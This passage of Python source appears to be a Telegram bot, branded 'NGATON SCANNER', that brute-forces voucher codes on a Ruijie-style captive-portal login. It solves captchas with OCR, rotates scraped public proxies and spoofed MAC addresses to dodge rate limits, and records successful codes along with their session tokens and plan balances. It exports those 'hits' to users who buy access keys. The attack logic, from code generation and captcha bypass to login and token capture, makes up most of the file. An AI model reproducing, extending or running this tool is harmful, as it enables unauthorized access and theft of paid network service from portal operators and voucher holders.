            except Exception: pass
        except Exception:
            pass

async def retry_stuck_loop(uid, run_id):
    ud = get_ud(uid)
    while not ud["stop_event"].is_set() and ud.get("run_id") == run_id:
        try:
            await asyncio.sleep(10)
            if ud["stop_event"].is_set(): break
            if ud.get("run_id") != run_id: break
            base = _portal_base(ud.get("portal_url"))
            stuck = [hd for hd in ud["hit_details"]
                     if hd.get("time_str") in ("⏳", "...fetching...", None)]
            for hd in stuck:
                if ud["stop_event"].is_set(): break
                if ud.get("run_id") != run_id: break
                token = hd.get("active_token")
                if not token: continue
                try:
                    plan, ts = await _bal_direct(token, base)
                    if ts:
                        hd["plan"] = plan or "Unknown"
                        hd["time_str"] = ts
                        hd["source"] = "retry"
                        ud["dash_update_event"].set()
                except Exception:
                    pass
                await asyncio.sleep(0.1)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  CHECK CODE 
# ═══════════════════════════════════════════════════════════════

async def check_code(session, code, sid, login_url, captcha_url, verify_url,
                     headers, uid, proxy, run_id):
    ud = get_ud(uid)
    if ud.get("run_id") != run_id: return "unknown"
    if ud["stop_event"].is_set(): return "unknown"

    ud["stats"]["tried"] += 1

    for attempt in range(CAPTCHA_MAX_RETRY):
        if ud.get("run_id") != run_id: return "unknown"
        if ud["stop_event"].is_set(): return "unknown"

        # ── Captcha ──
        auth = await solve_captcha(session, f"{captcha_url}?sessionId={sid}", headers)
        if not auth or len(auth) < 2:
            continue

        # ── Verify captcha ──
        try:
            async with session.post(verify_url,
                                    json={"sessionId": sid, "authCode": auth},
                                    headers=headers, ssl=False, timeout=6) as vr:
                if vr.status != 200: continue
                vd = await vr.json()
                if not vd.get("success"): continue
        except Exception:
            return "failed"   

        # ── Login (definitive) ──
        try:
            async with session.post(
                login_url,
                json={"accessCode": code, "sessionId": sid,
                      "apiVersion": 1, "authCode": auth},
                headers=headers, ssl=False, timeout=8) as lr:

                raw = await lr.text()
                txt = raw.lower()

                if '"success":true' in txt or "'success':true" in txt or '"success": true' in txt:
                    ud["stats"]["hits"] += 1
                    if proxy:
                        try: get_pm().mark_good(proxy)
                        except Exception: pass

                    token = None
                    try:
                        jd = json.loads(raw)
                        def _find_token(o, _d=0):
                            if _d > 6: return None
                            if isinstance(o, dict):
                                v = o.get("token")
                                if isinstance(v, str) and v.strip(): return v.strip()
                                for vv in o.values():
                                    if isinstance(vv, (dict, list)):
                                        r = _find_token(vv, _d + 1)
                                        if r: return r
                            elif isinstance(o, list):
                                for it in o:
                                    r = _find_token(it, _d + 1)
                                    if r: return r
                            return None
                        token = _find_token(jd)
                    except Exception:
                        pass
                    if not token:
                        m = re.search(r'token["\s:=\']+([A-Za-z0-9_\-\.]{6,})',
                                      raw, re.IGNORECASE)
                        if m: token = m.group(1)
                    if not token: token = sid

                    if not any(h["code"] == code for h in ud["hit_details"]):
                        ud["hit_details"].append({
                            "code": code, "plan": "⏳", "time_str": "⏳",
                            "time": datetime.datetime.now(),
                            "active_token": token,
                            "source_proxy": proxy, "source": "...",
                        })
                        ud["last_hit"] = code
                        ud["recent_logs"].append(f"🔥 HIT: {code}")
                        ud["dash_update_event"].set()
                        write_hit_url_tagged(uid, ud.get("portal_url", ""),
                                             code, "⏳", "⏳")
                        try: ud["balance_queue"].put_nowait((token, code))
                        except asyncio.QueueFull: pass
                    return "hit"

                if "request limited" in txt:
                    return "limit"
                if "the number of sta exceeds the limit" in txt:
                    ud["stats"]["limits"] += 1
                    return "limit"
                if "expired" in txt:
                    ud["stats"]["expired"] += 1
                    return "expired"
                return "invalid"

        except asyncio.CancelledError:
            raise
        except Exception:
            return "failed" 

    return "unknown"

def make_code(mode, counter=None):
    if mode == "custom" and counter is not None: return str(counter).zfill(6)
    spec = _MODE_SPEC.get(mode) or _MODE_SPEC["num6"]
    cs, ln = spec
    return "".join(random.choices(cs, k=ln))

# ═══════════════════════════════════════════════════════════════
#  WORKER — run_id aware
# ═══════════════════════════════════════════════════════════════

async def worker(wid, login_url, captcha_url, verify_url, headers, uid, run_id):
    ud = get_ud(uid); pm = get_pm()
    flush_counter = 0
    while not ud["stop_event"].is_set() and ud.get("run_id") == run_id:
        proxy = await pm.get_next()
        conn = make_connector(proxy) if proxy else None
        session = aiohttp.ClientSession(
            connector=conn, connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC))
        try:
            sid = None; this_sid = 0; this_sess = 0; fails = 0
            while (not ud["stop_event"].is_set()
                   and ud.get("run_id") == run_id
                   and this_sess < MAX_CODES_PER_SESSION):
                if sid is None or this_sid >= MAX_CODES_PER_SID:
                    sid, _ = await get_sid(session, ud["portal_url"], uid, run_id)
                    if sid is None:
                        fails += 1; ud["stats"]["net"] += 1
                        if fails >= 2:
                            if proxy: await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.1); continue
                    this_sid = 0; fails = 0

                code = None; mode = ud["mode"]
                for _ in range(15):
                    if mode == "custom":
                        ud["counter"] += 1
                        code = make_code(mode, ud["counter"])
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                    if code not in ud["tried_codes"]:
                        ud["tried_codes"].add(code)
                        add_pending(uid, code)
                        break
                    code = None
                if code is None:
                    continue

                ud["CURRENT_CODE"] = code

                result = await check_code(session, code, sid, login_url,
                                          captcha_url, verify_url, headers,
                                          uid, proxy, run_id)
                this_sid += 1; this_sess += 1
                flush_counter += 1

                if result in ("limit", "unknown"):
                    ud["tried_codes"].discard(code)
                    remove_pending(uid, code)

                if result == "limit":
                    sid = None
                    ud["dash_update_event"].set()
                    await asyncio.sleep(0.05)

                if flush_counter >= TRIED_FLUSH_EVERY:
                    flush_codes(uid)
                    flush_counter = 0

                if CODE_DELAY > 0:
                    await asyncio.sleep(CODE_DELAY)

        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        finally:
            try: await session.close()
            except Exception: pass
    try: flush_codes(uid)
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  UI  — ORIGINAL (untouched)
# ═══════════════════════════════════════════════════════════════

def _ft(ts):
    if not ts: return "⏳"
    s = str(ts); low = s.lower()
    if "fetch" in low or "net" in low or "❌" in s or "..." in s or s in ("N/A", "Unknown", ""):
        return "⏳"
    return s

def _fp(plan):
    if not plan: return "⏳"
    s = str(plan)
    if s in ("Unknown", "N/A", "") or "..." in s: return "⏳"
    return s

def _hits_section(hd_list, total, final=False, max_show=50):
    lines = []
    for hd in hd_list:
        c = hd.get("code", "?")
        p = _fp(hd.get("plan", "⏳"))
        ts = _ft(hd.get("time_str", "⏳"))
        if final: lines.append(f"  ▸ <code>{c}</code>  🗡️ {p}  ⏳ {ts}")
        else: lines.append(f"  ▸ <code>{c}</code>  •  {p}  •  {ts}")
    if lines:
        if len(lines) > max_show:
            hidden = len(lines) - max_show
            lines = [f"  … +{hidden} more"] + lines[-max_show:]
        body = "\n".join(lines)
    else: body = "  💀 No hits yet" if not final else "  💀 No hits"
    return (f"🎁 <b>HITS • {total}</b>\n"
            "┌───────────────────────┐\n"
            f"{body}\n"
            "└───────────────────────┘")

def _dashboard_text(ud, final=False):
    pm = get_pm(); _, active = pm.stats()
    proxy_val = f"{active}" if active > 0 else "DIRECT"
    elapsed = max(time.time() - ud["stats"]["start_time"], 1)
    speed = int(ud["stats"]["tried"] / elapsed * 60)
    hit_logs = [x for x in ud["recent_logs"] if x.startswith("🔥")]
    last_log = hit_logs[-1] if hit_logs else "🔍 scanning..."
    hits = _hits_section(ud["hit_details"], ud["stats"]["hits"], final=final)

    if final:
        head = ("╔═════════════════════════╗\n"
                "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
                "║     ⚡ <b>NGATON</b> ⚡       ║\n"
                "╚═════════════════════════╝\n\n"
                "📊 <b>FINAL REPORT</b>\n")
    else:
        head = ("╔═════════════════════════╗\n"
                "║   ⚡ <b>NGATON SCANNER</b> ⚡   ║\n"
                "║   ʀᴜɪᴊɪᴇ × ᴠᴏᴜᴄʜᴇʀ   ║\n"
                "╚═════════════════════════╝\n\n"
                "📊 <b>STATISTICS</b>\n")

    text = (head
            + f"├ 👁️ Tested  <code>{ud['stats']['tried']:,}</code>\n"
            + f"├ 🩸 Hits    <code>{ud['stats']['hits']}</code>\n"
            + f"└ ⚠️ Limits  <code>{ud['stats']['limits']}</code>\n\n"
            + "⚡ <b>PERFORMANCE</b>\n"
            + f"├ 🚀 Speed   <code>{speed:,} c/m</code>\n"
            + f"├ 👥 Workers <code>{ud['num_workers']}</code>\n"
            + f"└ 🕷️ Proxy   <code>{proxy_val}</code>\n\n"
            + "🎯 <b>CURRENT</b>\n"
            + f"├ 🔮 Code    <code>{ud['CURRENT_CODE'] or '—'}</code>\n"
            + f"├ 🗡️ Last    <code>{ud['last_hit'] or '—'}</code>\n"
            + f"└ 📜 Log     <code>{last_log}</code>\n\n"
            + hits + "\n\n"
            + "╭─ ⚡ NGATON · @NgaTON_0 ─╮")
    if len(text) > 4000:
        text = text[:3800] + "\n\n…\n\n╭─ ⚡ NGATON · @NgaTON_0 ─╮"
    return text

async def dashboard_loop(context, uid, run_id, dash_msg_id):
    ud = get_ud(uid)
    last_text = ""
    while not ud["stop_event"].is_set() and ud.get("run_id") == run_id:
        try:
            if ud.get("dash_msg_id") != dash_msg_id:
                break
            try:
                await asyncio.wait_for(ud["dash_update_event"].wait(),
                                       timeout=DASH_MIN_INTERVAL)
            except asyncio.TimeoutError:
                pass
            ud["dash_update_event"].clear()
            if ud["stop_event"].is_set(): break
            if ud.get("run_id") != run_id: break
            txt = _dashboard_text(ud)
            if txt != last_text:
                try:
                    await context.bot.edit_message_text(
                        chat_id=uid, message_id=dash_msg_id,
                        text=txt, parse_mode=ParseMode.HTML,
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
                        ]))
                    last_text = txt
                except Exception:
                    pass
        except asyncio.CancelledError:
            break
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  EXPORT
# ═══════════════════════════════════════════════════════════════

async def send_hits_file(context, uid, ud):
    if ud.get("_export_sent"): return
    hits = ud.get("hit_details", [])
    if not hits: return
    ud["_export_sent"] = True
    try:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"hits_{uid}_{ts}.txt"
        portal_url = ud.get("portal_url", "?")

        lines = []
        lines.append("=" * 60)
        lines.append("        NGATON SCANNER — HIT REPORT")
        lines.append("=" * 60)
        lines.append(f"User ID    : {uid}")
        lines.append(f"Username   : {ud.get('uname', '—') or '—'}")
        lines.append(f"Name       : {ud.get('name', '—') or '—'}")
        lines.append(f"Stopped    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"URL        : {portal_url}")
        lines.append(f"Mode       : {ud.get('mode', '?')}")
        lines.append("-" * 60)
        lines.append(f"Tested     : {ud['stats'].get('tried', 0):,}")
        lines.append(f"Hits       : {ud['stats'].get('hits', 0)}")
        lines.append(f"Limits     : {ud['stats'].get('limits', 0)}")
        lines.append("=" * 60)
        lines.append("")
        lines.append("CODE           | PLAN            | TIME")
        lines.append("-" * 60)
        for h in hits:
            c = h.get("code", "?")
            p = _fp(h.get("plan", "⏳"))
            t = _ft(h.get("time_str", "⏳"))
            lines.append(f"{c:<14} | {p:<15} | {t}")
        lines.append("")
        lines.append("=" * 60)
        lines.append(f"TOTAL: {len(hits)} hits")
        lines.append("=" * 60)

        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        with open(filename, "rb") as f:
            await context.bot.send_document(
                chat_id=uid,
                document=InputFile(f, filename=filename),
                caption=(f"📄 <b>HIT REPORT</b>\n"
                         f"━━━━━━━━━━━━━━━━━━\n"
                         f"🔗 URL: <code>{portal_url[:50]}...</code>\n"
                         f"🏹 Tested: <code>{ud['stats'].get('tried', 0):,}</code>\n"
                         f"🩸 Hits: <code>{ud['stats'].get('hits', 0)}</code>"),
                parse_mode=ParseMode.HTML)
        try: os.remove(filename)
        except Exception: pass
    except Exception as e:
        ud["_export_sent"] = False
        tprint(f"❌ EXPORT · {type(e).__name__}", cR)

async def _delayed_export(context, uid, ud):
    try:
        await asyncio.sleep(1.5)
        try: save_state_now(uid, ud)
        except Exception: pass
        try: flush_codes(uid)
        except Exception: pass
        await send_hits_file(context, uid, ud)
    except Exception as e:
        tprint(f"❌ DELAYED EXPORT · {type(e).__name__}", cR)
    finally:
        ud["stopped_by_user"] = False

# ═══════════════════════════════════════════════════════════════
#  RUN SCANNER — run_id generation
# ═══════════════════════════════════════════════════════════════

async def run_scanner(context, uid, run_id):
    ud = get_ud(uid)

    if not HAS_OCR:
        try:
            await context.bot.edit_message_text(
                chat_id=uid, message_id=ud["dash_msg_id"],
                text="❌ <b>ddddocr MISSING</b>\n\n<a href='tg://'>‹ Back</a>",
                parse_mode=ParseMode.HTML,
                reply_markup=back_markup())
        except Exception: pass
        ud["scanner_task"] = None
        return

    dash_msg_id = ud["dash_msg_id"]

    try:
        initial = _dashboard_text(ud)
        await context.bot.edit_message_text(
            chat_id=uid, message_id=dash_msg_id,
            text=initial, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
            ]))
    except Exception: pass

    login_url = f"{DEFAULT_PORTAL_BASE}/api/auth/voucher/?lang=en_US"
    captcha_url = f"{DEFAULT_PORTAL_BASE}/api/auth/captcha/image"
    verify_url = f"{DEFAULT_PORTAL_BASE}/api/auth/captcha/verify"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "Origin": DEFAULT_PORTAL_BASE,
        "Referer": f"{DEFAULT_PORTAL_BASE}/download/static/maccauth/src/index.html",
    }

    tasks = [asyncio.create_task(dashboard_loop(context, uid, run_id, dash_msg_id)),
             asyncio.create_task(retry_stuck_loop(uid, run_id))]

    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker_bg(uid, bw, run_id)))

    num = ud.get("num_workers", NUM_WORKERS)
    for i in range(num):
        tasks.append(asyncio.create_task(
            worker(i, login_url, captcha_url, verify_url, headers, uid, run_id)))

    ud["task"] = asyncio.current_task()

    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done(): t.cancel()
        raise
    finally:
        
        if ud.get("run_id") != run_id:
            return

        try: flush_codes(uid)
        except Exception: pass

        base = _portal_base(ud.get("portal_url"))
        try:
            stuck = [hd for hd in ud["hit_details"]
                     if hd.get("time_str") in ("⏳", "...fetching...", None)]
            for hd in stuck:
                token = hd.get("active_token")
                if not token: continue
                try:
                    plan, ts = await _bal_direct(token, base)
                    if ts:
                        hd["plan"] = plan or "Unknown"
                        hd["time_str"] = ts
                        hd["source"] = "final"
                        ud["dash_update_event"].set()
                except Exception: pass
        except Exception: pass

        try: save_state_now(uid, ud)
        except Exception: pass

        try:
            txt = _dashboard_text(ud, final=True)
            await context.bot.edit_message_text(
                chat_id=uid, message_id=dash_msg_id,
                text=txt, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("‹ 🦇 RETURN", callback_data="btn_back_main")]
                ]))
        except Exception: pass

        if ud.get("stopped_by_user") and not ud.get("_export_sent"):
            try:
                asyncio.create_task(_delayed_export(context, uid, ud))
            except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  PROXY CHECKER
# ═══════════════════════════════════════════════════════════════

async def fetch_proxy_list(url):
    proxies = []
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=15) as r:
                if r.status != 200: return []
                ct = r.headers.get("content-type", "")
                if "application/json" in ct:
                    data = await r.json()
                    items = data if isinstance(data, list) else None
                    if items:
                        for it in items:
                            if isinstance(it, dict) and "ip" in it and "port" in it:
                                proxies.append(f"http://{it['ip']}:{it['port']}")
                else:
                    text = await r.text()
                    for ln in text.splitlines():
                        ln = ln.strip()
                        if ln and not ln.startswith("#"):
                            if not ln.startswith(("http://", "https://")):
                                ln = "http://" + ln
                            proxies.append(ln)
    except Exception: pass
    return proxies

async def check_proxy_working(session, proxy, portal_url, sem, stop_event, uid):
    async with sem:
        if stop_event.is_set(): return None
        try:
            h = {"User-Agent": random.choice(USER_AGENTS)}
            ud = get_ud(uid)
            test = ud.get("portal_url") or portal_url
            u = urlparse(test); q = parse_qs(u.query)
            q["mac"] = [gen_mac()]
            sp = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            async with session.get(sp, headers=h, timeout=5, ssl=False, proxy=proxy) as r:
                body = await r.text()
                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if m:
                    nu = urljoin(sp, m.group(1))
                    async with session.get(nu, headers=h, timeout=5, ssl=False, proxy=proxy) as r2:
                        fu = str(r2.url)
                else: fu = str(r.url)
                pq = parse_qs(urlparse(fu).query)
                sid = pq.get("sessionId", pq.get("sid", [None]))[0]
                if sid: return proxy
        except Exception: pass
        return None

async def run_proxy_check(context, chat_id, uid, sources=None):
    stop = asyncio.Event()
    user_proxy_checks[uid] = {"stop_event": stop}
    if sources is None: sources = PROXY_SOURCES

    try:
        init = await context.bot.send_message(
            chat_id,
            "🕷️ <b>PROXY CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n⏳ Downloading...",
            parse_mode=ParseMode.HTML)
    except Exception:
        user_proxy_checks.pop(uid, None); return
    msg_id = init.message_id
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP & SAVE", callback_data="proxy_check_stop")],
        [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
    ])
    all_p = []
    for i, url in enumerate(sources, 1):
        if stop.is_set(): break
        ps = await fetch_proxy_list(url)
        all_p.extend(ps)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=(f"🕷️ <b>PROXY CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n"
                      f"📥 Source {i}/{len(sources)}\n"
                      f"📊 Current: {len(ps)}\n"
                      f"🎯 Total: {len(all_p)}"),
                parse_mode=ParseMode.HTML, reply_markup=stop_kb)
        except Exception: pass
    seen = set(); unique = []
    for p in all_p:
        if p not in seen: seen.add(p); unique.append(p)
    if not unique:
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                                                text="❌ No proxies found",
                                                reply_markup=back_markup())
        except Exception: pass
        user_proxy_checks.pop(uid, None); return
    total = len(unique)
    sem = asyncio.Semaphore(100)
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    to = aiohttp.ClientTimeout(total=5)
    portal = (get_ud(uid).get("portal_url")
              or f"{DEFAULT_PORTAL_BASE}/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00")
    good = []; checked = 0; last_up = time.time()
    async with aiohttp.ClientSession(connector=conn, timeout=to) as s:
        tasks = [asyncio.create_task(check_proxy_working(s, p, portal, sem, stop, uid))
                 for p in unique]
        for coro in asyncio.as_completed(tasks):
            if stop.is_set():
                for t in tasks:
                    if not t.done(): t.cancel()
                break
            try: r = await coro
            except Exception: r = None
            if r: good.append(r)
            checked += 1
            now = time.time()
            if checked % 50 == 0 or now - last_up > 2 or checked == total:
                last_up = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=(f"🕷️ <b>PROXY CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n"
                              f"📊 Checked: {checked}/{total}\n"
                              f"✅ Working: {len(good)}"),
                        parse_mode=ParseMode.HTML, reply_markup=stop_kb)
                except Exception: pass
    pm = get_pm()
    added = pm.add(good) if good else 0
    title = "🛑 STOPPED" if stop.is_set() else "✅ DONE"
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=(f"🕷️ <b>PROXY CHECKER · {title}</b>\n━━━━━━━━━━━━━━━━━━\n"
                  f"🎯 Total: {total:,}\n✅ Working: {len(good)}\n"
                  f"📥 Added: {added} new"),
            parse_mode=ParseMode.HTML,
            reply_markup=back_markup())
    except Exception: pass

    user_proxy_checks.pop(uid, None)

# ═══════════════════════════════════════════════════════════════
#  MENUS  
# ═══════════════════════════════════════════════════════════════

def main_menu(is_admin_user=False):
    rows = [
        [InlineKeyboardButton("🔮 PORTAL", callback_data="btn_update_portal"),
         InlineKeyboardButton("📜 MODES", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("⚡ START SCAN", callback_data="btn_start_scanner"),
         InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")],
        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_proxy_status"),
         InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clear_proxies")],
        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_add_proxies"),
         InlineKeyboardButton("🔍 CHECK", callback_data="btn_proxy_checker")],
        [InlineKeyboardButton("🔗 MANUAL URL", callback_data="btn_manual_url"),
         InlineKeyboardButton("♻️ RESET JOB", callback_data="btn_reset_job")],
    ]
    if is_admin_user:
        rows.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel")])
    rows.append([InlineKeyboardButton("⚡ NGATON ⚡", url=CONTACT_LINK)])
    return InlineKeyboardMarkup(rows)

def mode_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("NUM 6", callback_data="set_mode_num6"),
         InlineKeyboardButton("NUM 7", callback_data="set_mode_num7"),
         InlineKeyboardButton("NUM 8", callback_data="set_mode_num8"),
         InlineKeyboardButton("NUM 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton("ABC 6", callback_data="set_mode_abc6"),
         InlineKeyboardButton("ENG 6", callback_data="set_mode_eng6"),
         InlineKeyboardButton("ENG 7", callback_data="set_mode_eng7")],
        [InlineKeyboardButton("ENG 8", callback_data="set_mode_eng8"),
         InlineKeyboardButton("ENG 9", callback_data="set_mode_eng9")],
        [InlineKeyboardButton("MIX 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton("MIX 7", callback_data="set_mode_mix7"),
         InlineKeyboardButton("MIX 8", callback_data="set_mode_mix8"),
         InlineKeyboardButton("MIX 9", callback_data="set_mode_mix9")],
        [InlineKeyboardButton("CUSTOM START", callback_data="set_mode_custom")],
        [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
    ])

def back_markup(cb="btn_back_main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 RETURN", callback_data=cb)]])

def access_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 ENTER KEY", callback_data="btn_enter_key")],
        [InlineKeyboardButton("⚡ NGATON ⚡", url=CONTACT_LINK)],
    ])

def key_entry_markup():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back_to_access")]])

def admin_panel_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 GEN KEY", callback_data="admin_gen_key"),
         InlineKeyboardButton("🗑 DEL KEY", callback_data="admin_del_key")],
        [InlineKeyboardButton("📋 LIST KEYS", callback_data="admin_list_keys"),
         InlineKeyboardButton("👥 USERS", callback_data="admin_users_list")],
        [InlineKeyboardButton("📇 BOT USERS", callback_data="admin_bot_users"),
         InlineKeyboardButton("♾ UNLIMITED", callback_data="admin_set_unlimited")],
        [InlineKeyboardButton("📊 STATS", callback_data="admin_bot_stats"),
         InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("👑 ADMINS", callback_data="admin_list_admins"),
         InlineKeyboardButton("🧹 CLEAR ALL", callback_data="admin_clear_all_keys")],
        [InlineKeyboardButton("🔙 CLOSE", callback_data="admin_close")],
    ])

def clear_all_confirm():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ YES, CLEAR ALL", callback_data="admin_clear_all_confirm"),
         InlineKeyboardButton("❌ CANCEL", callback_data="admin_panel")],
    ])

def reset_job_confirm():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ YES, RESET", callback_data="reset_job_confirm"),
         InlineKeyboardButton("❌ CANCEL", callback_data="btn_back_main")],
    ])

def admin_duration_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱ 1H", callback_data="admin_dur_1h"),
         InlineKeyboardButton("⏱ 6H", callback_data="admin_dur_6h"),
         InlineKeyboardButton("📅 1D", callback_data="admin_dur_1d")],
        [InlineKeyboardButton("📅 3D", callback_data="admin_dur_3d"),
         InlineKeyboardButton("📅 7D", callback_data="admin_dur_7d"),
         InlineKeyboardButton("📅 30D", callback_data="admin_dur_30d")],
        [InlineKeyboardButton("📅 1Y", callback_data="admin_dur_1y"),
         InlineKeyboardButton("♾ UNLIMITED", callback_data="admin_dur_unlimited")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin_panel")],
    ])

def admin_panel_text():
    keys = load_keys(); users = load_users()
    bu = load_bot_users(); admins = load_admin_ids()
    pm = get_pm(); tp, ap = pm.stats()
    return (
        "👑 <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Keys       : <code>{len(keys)}</code>\n"
        f"👥 Users      : <code>{len(users)}</code>\n"
        f"📇 Bot Users  : <code>{len(bu)}</code>\n"
        f"👑 Admins     : <code>{len(admins)}</code>\n"
        f"🔀 Proxies    : <code>{ap}/{tp}</code>\n"
        f"🕐 MMT        : <code>{now_mm().strftime('%Y-%m-%d %I:%M %p')}</code>\n"
        "━━━━━━━━━━━━━━━━━━"
    )

def main_menu_text(uid):
    ud = get_ud(uid)
    _, msg = check_user_access(uid)
    pm = get_pm(); tp, ap = pm.stats()
    saved = get_saved_state(uid)
    resume_line = ""
    if saved and saved.get("url") == (ud.get("portal_url") or ""):
        resume_line = (
            f"\n💾 <b>Resume Ready</b>\n"
            f"├ Tried: <code>{saved.get('tried', 0):,}</code>\n"
            f"├ Hits:  <code>{saved.get('hits', 0)}</code>\n"
            f"└ Mode:  <code>{MODES.get(saved.get('mode','num6'), '')}</code>\n"
        )
    return (
        "╔═════════════════════════╗\n"
        "║    ⚡ <b>NGATON</b> ⚡         ║\n"
        "║   ʀᴜɪᴊɪᴇ × ᴠᴏᴜᴄʜᴇʀ   ║\n"
        "╚═════════════════════════╝\n"
        f"\n🔐 Access: <b>{msg}</b>\n"
        f"📜 Mode: <code>{MODES.get(ud['mode'], ud['mode'])}</code>\n"
        f"🕷️ Proxies: <code>{ap}/{tp}</code>\n"
        f"⚡ Workers: <code>{ud['num_workers']}</code>\n"
        f"🔮 Portal: {'✅ Ready' if ud.get('portal_url') else '❌ Not set'}\n"
        f"{resume_line}"
        "\n💡 <b>Setup:</b> Portal → Proxies → Start\n"
        "📌 Contact: @NgaTON_0"
    )

# ═══════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════

async def start(update, context, *a, **kw):
    uid = update.effective_user.id
    u = update.effective_user
    try: track_bot_user(u)
    except Exception: pass
    ud = get_ud(uid)
    ud["uname"] = u.username or ""
    ud["name"] = u.first_name or ""

    if not is_admin(uid):
        ok, msg = check_user_access(uid)
        if not ok:
            await update.message.reply_text(
                f"🔐 <b>ACCESS REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"👤 ID: <code>{uid}</code>\n📋 <b>{msg}</b>\n\n"
                f"🔑 Enter your key",
                parse_mode=ParseMode.HTML, reply_markup=access_markup())
            return

    ud["state"] = None
    msg = await update.message.reply_text(
        main_menu_text(uid), parse_mode=ParseMode.HTML,
        reply_markup=main_menu(is_admin(uid)))
    ud["menu_msg_id"] = msg.message_id

async def stop_command(update, context, *a, **kw):
    uid = update.effective_user.id
    ud = get_ud(uid)
    if ud.get("scanner_task") and not ud["scanner_task"].done():
        ud["stopped_by_user"] = True
        ud["_export_sent"] = False
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        await update.message.reply_text(
            "🛑 <b>STOPPING...</b>\n📄 Exporting hits...",
            parse_mode=ParseMode.HTML, reply_markup=back_markup())
    else:
        await update.message.reply_text("ℹ️ Nothing running.", reply_markup=back_markup())

async def myid_command(update, context, *a, **kw):
    uid = update.effective_user.id
    _, msg = check_user_access(uid)
    await update.message.reply_text(
        f"👤 <b>Your Info</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"👑 Admin: {'✅' if is_admin(uid) else '❌'}\n"
        f"🔐 Access: {msg}",
        parse_mode=ParseMode.HTML, reply_markup=back_markup())

async def mykey_command(update, context, *a, **kw):
    context.user_data["waiting_for_key"] = True
    await update.message.reply_text(
        "🔑 <b>ENTER KEY</b>\nFormat: <code>XXXX-XXXX-XXXX-XXXX</code>",
        parse_mode=ParseMode.HTML, reply_markup=key_entry_markup())

async def addadmin_command(update, context, *a, **kw):
    uid = update.effective_user.id
    if not is_admin(uid): return
    args = context.args
    if not args:
        await update.message.reply_text("<code>/addadmin 12345</code>", parse_mode=ParseMode.HTML); return
    try: t = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid"); return
    if add_admin_id(t):
        await update.message.reply_text(f"✅ Added <code>{t}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"ℹ️ Already <code>{t}</code>", parse_mode=ParseMode.HTML)

async def removeadmin_command(update, context, *a, **kw):
    uid = update.effective_user.id
    if not is_admin(uid): return
    args = context.args
    if not args: return
    try: t = int(args[0])
    except ValueError: return
    if t in ADMIN_IDS:
        await update.message.reply_text(f"⚠️ Hardcoded <code>{t}</code>", parse_mode=ParseMode.HTML); return
    if remove_admin_id(t):
        await update.message.reply_text(f"✅ Removed <code>{t}</code>", parse_mode=ParseMode.HTML)

async def broadcast_command(update, context, *a, **kw):
    uid = update.effective_user.id
